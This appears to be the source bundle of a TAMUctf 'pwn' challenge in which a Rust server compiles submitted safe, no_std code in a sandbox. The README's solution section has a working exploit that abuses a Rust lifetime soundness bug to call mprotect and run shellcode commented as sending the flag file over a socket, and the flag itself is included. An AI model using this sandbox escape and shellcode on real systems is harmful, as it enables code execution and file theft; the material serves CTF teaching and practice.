{
    ".dockerignore": "target\n",
    ".gitignore": "/target\nCargo.lock\n",
    "Cargo.toml": "[package]\nname = \"sacrifice\"\nversion = \"0.1.0\"\nedition = \"2021\"\n\n[dependencies]\ntokio = { version = \"1.0\", features = [\"macros\", \"process\", \"rt-multi-thread\", \"time\"] }\nwarp = { version = \"0.3\", default-features = false }\nonce_cell = \"1.9.0\"\nsha2 = \"0.10.1\"\nrand = \"0.8.4\"\nserde = { version = \"1.0\", features = [\"derive\"] }\n\n[profile.release]\nlto = true\ncodegen-units = 1\n",
    "Dockerfile": "FROM rust:slim-buster as build\n\nCOPY src /opt/sacrifice/src\nCOPY Cargo.toml /opt/sacrifice/Cargo.toml\n\nRUN cargo build --release --manifest-path /opt/sacrifice/Cargo.toml\n\nFROM rust:slim-buster\n\nCOPY --from=build /opt/sacrifice/target/release/sacrifice /sacrifice/server\nCOPY std-lol /sacrifice/std-lol\nCOPY flag.txt /sacrifice\nCOPY static/ /sacrifice/static\nCOPY runners/ /sacrifice/runners\n\nWORKDIR /sacrifice\n\nEXPOSE 7777\n\nENTRYPOINT [\"/sacrifice/server\"]\n",
    "flag.txt": "gigem{wh0_n33d5_un54f3_wh3n_y0u_h4v3_un50undn355}\n",
    "Makefile": "run: docker\n\tdocker run --restart=always --name sacrifice -p 7777:7777 sacrifice\nstop:\n\tdocker container rm -f sacrifice\ndocker:\n\ttouch flag.txt\n\tdocker build -t sacrifice .\ndist:\n\tzip -r sacrifice.zip src static std-lol runners Makefile Dockerfile README.md Cargo.toml\n",
    "README.md": "# Sacrifice\n## Description\nOne of the TAMUctf devs committed some heinous crimes with `unsafe`, so Ferris cast our poor dev into UB jail. The almighty crab's ire can only be appeased with an offering of the finest, 110% safe, non-GMO Rust code -- can you make a worthy sacrifice and save our dev?\n\n## Solution\n\n1. pain\n2. https://github.com/rust-lang/rust/issues/25860\n3. haha ub go brr\n\n```rust\nstatic UNIT: &'static &'static () = &&();\n\nfn foo<'a, 'b, T>(_: &'a &'b (), v: &'b T) -> &'a T { v }\n\nfn lmao<'a, T>(x: &'a T) -> &'static T {\n    let f: fn(_, &'a T) -> &'static T = foo;\n    f(UNIT, x)\n}\n\n\nfn valid(a: usize, b: usize, c:u32) {}\n\nfn make_funny_ref() -> &'static &'static fn(usize, usize, u32) {\n    let r = &(valid as fn(usize, usize, u32));\n    lmao(&r)\n}\n\nfn wrap_mprotect() {\n    let x= 0xc3050f0000000ab8usize;\n}\n\nfn pwn(func: &'static &fn(usize, usize, u32), target: usize, shellcode: usize) {\n    let r = &target;\n    func(shellcode,0x1000,7);\n}\n\n// open socket 127.0.0.1:4444 and copy /sacrifice/flag.txt to it\nstatic SHELLCODE: [u8; 116] = [106,41,88,106,2,95,106,1,94,153,15,5,72,137,197,72,184,1,1,1,1,1,1,1,2,80,72,184,3,1,16,93,126,1,1,3,72,49,4,36,106,42,88,72,137,239,106,16,90,72,137,230,15,5,104,117,121,117,1,129,52,36,1,1,1,1,72,184,99,101,47,102,108,97,103,46,80,72,184,47,115,97,99,114,105,102,105,80,106,2,88,72,137,231,49,246,15,5,65,186,255,255,255,127,72,137,198,106,40,88,72,137,239,153,15,5];\npub fn main() {\n    let shellcode = &SHELLCODE as *const _  as usize;\n    let real_mprotect = wrap_mprotect as fn() as *const ()  as usize + 3;\n    let valid_ref = make_funny_ref();\n    pwn(valid_ref, real_mprotect, shellcode >> 12 << 12); //\n    pwn(valid_ref, shellcode, 0);\n}\n```\n4. survive being executed for terrible writeup",
    "runners\\.gitignore": "!.gitignore\n",
    "src\\main.rs": "use once_cell::sync::Lazy;\nuse rand::distributions::{Alphanumeric, DistString};\nuse rand::Rng;\nuse serde::{Deserialize, Serialize};\nuse sha2::{Digest, Sha256};\nuse std::collections::HashSet;\nuse std::error::Error;\nuse std::process::Stdio;\nuse std::sync::Mutex;\nuse tokio::fs;\nuse tokio::process::Command;\nuse tokio::time::{self, Duration};\nuse warp::http::StatusCode;\nuse warp::Filter;\n\nstatic POWS: Lazy<Mutex<HashSet<Pow>>> = Lazy::new(|| Mutex::new(HashSet::with_capacity(32)));\nconst MAX_SANDBOX_TIMEOUT: Duration = Duration::from_secs(10);\nconst MAX_POW_TIMEOUT: Duration = Duration::from_secs(60 * 5);\n\n#[derive(Debug, Clone, PartialEq, Eq, Hash, Deserialize, Serialize)]\nstruct Pow {\n    prefix: String,\n    hardness: usize,\n}\n\nimpl Pow {\n    fn new() -> Self {\n        let mut rng = rand::thread_rng();\n        let prefix_len = rng.gen_range(24..=32);\n        let prefix = Alphanumeric.sample_string(&mut rng, prefix_len);\n        let chall = Self {\n            prefix,\n            hardness: rng.gen_range(23..=25),\n        };\n        let clone = chall.clone();\n        let clone2 = chall.clone();\n        POWS.lock().unwrap().insert(clone);\n        tokio::spawn(async move {\n            time::sleep(MAX_POW_TIMEOUT).await;\n            POWS.lock().unwrap().remove(&clone2);\n        });\n        chall\n    }\n}\n\n#[derive(Debug, Clone, PartialEq, Eq, Hash, Deserialize, Serialize)]\nstruct Solve {\n    pow: Pow,\n    solve: String,\n    src: String,\n}\n\nimpl Solve {\n    fn check_pow(&self) -> bool {\n        if POWS.lock().unwrap().remove(&self.pow) {\n            let mut hasher = Sha256::default();\n            hasher.update(&self.solve);\n            let digest = hasher.finalize();\n            let digest = digest.as_slice();\n            let bytes = self.pow.hardness / 8;\n            let bits = (self.pow.hardness % 8) as u32;\n            digest[..bytes].iter().all(|&x| x == 0)\n                && digest[bytes].checked_shr(8 - bits).unwrap_or(0) == 0\n        } else {\n            false\n        }\n    }\n}\n\nasync fn sandbox(src: &str, root: &str) -> Result<(), Box<dyn Error>> {\n    fs::create_dir_all(format!(\"{root}/sandbox/src\")).await?;\n    fs::create_dir_all(format!(\"{root}/runner/src\")).await?;\n    fs::write(\n        format!(\"{root}/sandbox/Cargo.toml\"),\n        r#\"\n[package]\nname = \"sandbox\"\nversion = \"0.1.0\"\nedition = \"2021\"\n\n[dependencies]\nstd = { path = \"../../../std-lol\" }\n    \"#,\n    )\n    .await?;\n    fs::write(\n        format!(\"{root}/sandbox/src/lib.rs\"),\n        format!(\n            r#\"\n#![no_std]\n#![forbid(unsafe_code)]\nmod user {{\n    {src}\n}}\npub use user::main;\n    \"#\n        ),\n    )\n    .await?;\n    fs::write(\n        format!(\"{root}/runner/src/main.rs\"),\n        \"fn main() { sandbox::main(); }\",\n    )\n    .await?;\n    let toml = format!(\"{root}/runner/Cargo.toml\");\n    fs::write(\n        &toml,\n        r#\"\n[package]\nname = \"runner\"\nversion = \"0.1.0\"\nedition = \"2021\"\n\n[dependencies]\nsandbox = { path = \"../sandbox\" }\n\n[profile.dev]\nincremental = false\n    \"#,\n    )\n    .await?;\n\n    let mut child = Command::new(\"cargo\")\n        .arg(\"run\")\n        .arg(\"--manifest-path\")\n        .arg(&toml)\n        .stdin(Stdio::null())\n        .stdout(Stdio::null())\n        .stderr(Stdio::null())\n        .kill_on_drop(true)\n        .spawn()?;\n\n    tokio::select! {\n        _ = time::sleep(MAX_SANDBOX_TIMEOUT) => {\n            child.kill().await?;\n            Err(\"exceeded maximum timeout length\".into())\n        },\n        status = child.wait() => {\n            if !status?.success() {\n                Err(\"child finished with non-zero exit code\".into())\n            } else {\n                Ok(())\n            }\n        },\n    }\n}\n\n#[tokio::main]\nasync fn main() {\n    let files = warp::fs::dir(\"static\");\n\n    let pow = warp::path::path(\"pow\")\n        .and(warp::get())\n        .map(|| warp::reply::json(&Pow::new()));\n\n    let sacrifice = warp::path::path(\"sacrifice\")\n        .and(warp::post())\n        .and(warp::body::content_length_limit(1024 * 2))\n        .and(warp::body::json())\n        .map(|solve: Solve| {\n            // I don't like twitter\n            if !solve.check_pow() || solve.src.contains('#') {\n                StatusCode::BAD_REQUEST\n            } else {\n                tokio::spawn(async move {\n                    let id = solve.pow.prefix;\n                    let root = format!(\"runners/{id}\");\n                    if let Err(e) = sandbox(&solve.src, &root).await {\n                        eprintln!(\"{}\", e);\n                    }\n                    let _ = fs::remove_dir_all(&root).await;\n                });\n                StatusCode::OK\n            }\n        });\n\n    warp::serve(files.or(pow).or(sacrifice))\n        .run(([0, 0, 0, 0], 7777))\n        .await;\n}\n",
    "static\\favicon.ico": "[Binary file or unsupported type: ico]",
    "static\\index.html": "<!DOCTYPE html>\n<html lang=\"en\">\n    <head>\n        <!-- imagine knowing how to web dev, could not be me -->\n        <meta charset=\"utf-8\" />\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />\n        <title>sacrifice</title>\n        <script\n            src=\"https://cdnjs.cloudflare.com/ajax/libs/ace/1.4.13/ace.js\"\n            type=\"text/javascript\"\n            charset=\"utf-8\"\n            ></script>\n        <script\n            src=\"https://cdnjs.cloudflare.com/ajax/libs/js-sha256/0.9.0/sha256.min.js\"\n            type=\"text/javascript\"\n            charset=\"utf-8\"\n            ></script>\n        <link\n            href=\"https://cdn.jsdelivr.net/npm/modern-normalize@1.1.0/modern-normalize.min.css\"\n            rel=\"stylesheet\"\n            />\n        <link href=\"https://fonts.googleapis.com/css2?family=Recursive:wght,CASL,MONO@700,1,1&display=swap\" rel=\"stylesheet\"> \n        <style>\n            :root {\n                --size-medium: 1rem;\n                --toolbar-height: 5rem;\n            }\n            body {\n                background-color: #e1e1db;\n                padding: var(--size-medium);\n                font-family: \"Recursive\", \"Lucida Console\", \"Courier New\", monospace;\n            }\n            #editor {\n                position: absolute;\n                width: calc(100% - (2 * var(--size-medium)));\n                top: var(--toolbar-height);\n                min-height: calc(100% - var(--toolbar-height) - var(--size-medium));\n                border-radius: 0.25rem;\n                border: #bbb solid 0.25rem;\n            }\n            #toolbar {\n                display: flex;\n                flex-direction: row;\n            }\n            #toolbar > * + * {\n                padding-left: 1rem;\n            }\n            #offer {\n                background-color: #aa4422;\n                color: #ffffff;\n                border: none;\n                padding: var(--size-medium);\n                border-radius: 0.25rem;\n            }\n            #offer:hover {\n                background-color: #80331a;\n                cursor: pointer;\n            }\n            #offer:disabled {\n                background-color: #80331a;\n                cursor: default;\n            }\n        </style>\n    </head>\n    <body>\n        <div id=\"toolbar\">\n            <button id=\"offer\" onclick=\"submitCode()\">SACRIFICE</button>\n            <p id=\"status\"><-- Click here to sacrifice your code</p>\n        </div>\n        <div class=\"editor-container\">\n            <div id=\"editor\"></div>\n        </div>\n        <script>\n            const submit = document.getElementById(\"offer\");\n            const status = document.getElementById(\"status\");\n            const editor = ace.edit(\"editor\");\n            editor.resize();\n            editor.setTheme(\"ace/theme/github\");\n            editor.getSession().setMode(\"ace/mode/rust\");\n            editor.setShowPrintMargin(false);\n            editor.setFontSize(18);\n            editor.setValue(\n                \"pub fn main() {\\n    // TODO: your wholesome code goes here!\\n}\\n\"\n            );\n\n            const worker = new Worker(\"worker.js\");\n            function failure(e) {\n                status.innerText = \"Something went wrong -- try submitting again?\"\n                submit.disabled = false;\n                console.error(e);\n            }\n            worker.onmessage = async (e) => {\n                const { pow, solve } = e.data;\n                const payload = {\n                    pow,\n                    src: editor.getValue(),\n                    solve,\n                };\n                try {\n                    const ack = await fetch(\"/sacrifice\", {\n                        method: \"POST\",\n                        headers: { \"Content-Type\": \"application/json\" },\n                        body: JSON.stringify(payload),\n                    });\n                    if (ack.status === 200) {\n                        status.innerText = \"Done! Offer up some more code if you'd like :D\";\n                        submit.disabled = false;\n                    } else {\n                        failure(ack.status);\n                    }\n                } catch (e) {\n                    failure(e);\n                }\n            };\n            async function submitCode() {\n                status.innerText = \"Solving proof of work...\";\n                submit.disabled = true;\n                try {\n                    const response = await fetch(\"/pow\");\n                    if (response.status === 200) {\n                        const pow = await response.json();\n                        worker.postMessage(pow);\n                    } else {\n                        failure(response.status);\n                    }\n                } catch (e) {\n                    failure(e);\n                }\n            }\n        </script>\n        <noscript> You need to enable Javascript to run this challenge. </noscript>\n    </body>\n</html>\n",
    "static\\worker.js": "importScripts(\"https://cdnjs.cloudflare.com/ajax/libs/js-sha256/0.9.0/sha256.min.js\")\n\nfunction solvePow({prefix, hardness}) {\n    let i = 1;\n    while (true) {\n        const guess = prefix + i.toString();\n        const hasher = sha256.create();\n        hasher.update(guess);\n        const hash = hasher.array();\n        const bytes = Math.floor(hardness / 8);\n        const bits = hardness % 8;\n        if (\n            hash.slice(0, bytes).every((b) => b === 0) &&\n            hash[bytes] >> (8 - bits) === 0\n        ) {\n            return guess;\n        }\n        i += 1;\n    }\n}\n\nonmessage = e => {\n    const pow = e.data;\n    const solve = solvePow(pow);\n    postMessage({ pow, solve })\n};\n",
    "std-lol\\Cargo.toml": "[package]\nname = \"std\"\nversion = \"0.1.0\"\nedition = \"2021\"\n\n[dependencies]\n",
    "std-lol\\src\\lib.rs": "",
    "category": "pwn"
}